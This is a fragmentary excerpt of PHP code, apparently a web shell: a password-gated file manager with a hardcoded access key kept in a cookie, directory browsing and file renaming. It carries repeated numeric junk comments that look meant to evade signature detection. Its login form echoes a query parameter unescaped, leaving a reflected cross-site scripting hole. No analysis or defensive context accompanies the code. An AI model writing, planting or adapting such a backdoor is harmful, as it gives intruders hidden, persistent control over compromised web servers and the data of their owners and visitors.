...
$auth_key = "d27da4ab98ebbb5957557f7d15ff473e";
...
$pass = false;
if (isset($_COOKIE['pw_name_16705'])) {
    if(($_COOKIE['pw_name_16705']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_16705'])) {
        if(($_POST['pw_name_16705']) == $auth_key) {
            setcookie("pw_name_16705", $_POST['pw_name_16705']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_16705' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724653463299136 1724653463831519 1724653463418502 1724653463965374
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724653463299136 1724653463831519 1724653463418502 1724653463965374
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724653463299136 1724653463831519 1724653463418502 1724653463965374
            $name = PATH . "/" . $_GET['r'];
